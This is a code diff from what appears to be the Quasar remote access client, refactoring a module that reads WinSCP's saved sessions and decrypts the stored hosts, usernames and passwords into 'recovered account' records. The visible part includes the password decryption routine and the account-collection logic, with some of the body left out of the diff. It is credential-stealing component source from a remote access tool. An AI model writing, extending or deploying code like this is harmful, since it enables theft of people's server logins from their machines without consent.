@@ -1,16 +1,20 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
+using System;
+using System.Collections.Generic;
+using System.Linq;
 
 namespace Quasar.Client.Recovery.FtpClients
 {
-    public class WinSCP
+    public class WinScpPassReader : IAccountReader
     {
-        public static List<RecoveredAccount> GetSavedPasswords()
+        /// <inheritdoc />
+        public string ApplicationName => "WinSCP";
+
+        /// <inheritdoc />
+        public IEnumerable<RecoveredAccount> ReadAccounts()
         {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
             try
@@ -40,7 +44,7 @@ namespace Quasar.Client.Recovery.FtpClients
                                 Url = host,
                                 Username = user,
                                 Password = password,
-                                Application = "WinSCP"
+                                Application = ApplicationName
                             });
                         }
                     }
@@ -53,14 +57,15 @@ namespace Quasar.Client.Recovery.FtpClients
             }
         }
 
-        static int dec_next_char(List<string> list)
+        private int dec_next_char(List<string> list)
         {
             int a = int.Parse(list[0]);
             int b = int.Parse(list[1]);
             int f = (255 ^ (((a << 4) + b) ^ 0xA3) & 0xff);
             return f;
         }
-        static string WinSCPDecrypt(string user, string pass, string host)
+
+        private string WinSCPDecrypt(string user, string pass, string host)
         {
             try
             {
